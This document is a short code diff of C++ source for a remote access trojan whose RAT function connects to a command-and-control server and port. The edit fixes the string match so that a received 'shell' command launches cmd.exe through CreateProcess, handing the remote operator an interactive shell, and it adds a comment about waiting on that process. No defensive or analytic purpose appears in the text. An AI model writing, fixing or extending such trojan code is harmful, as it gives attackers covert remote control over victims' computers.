@@ -112,7 +112,7 @@ void RAT(char* C2_Server, int C2_Port)
                 std::cout << "Length of Command received: " << result << std::endl;
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(CommandReceived, "shell\n") == 0))
+                if ((strcmp(CommandReceived, "shell") == 0))
                 {
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
@@ -125,7 +125,9 @@ void RAT(char* C2_Server, int C2_Port)
 
                     CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
-                    WaitForSingleObject(pinfo.hProcess, INFINITE);
+                    // We are here, hanging in the cmd.exe process until it is closed by a TERM or exit command
+                    WaitForSingleObject(pinfo.hProcess, INFINITE); 
+
                     CloseHandle(pinfo.hProcess);
                     CloseHandle(pinfo.hThread);
 
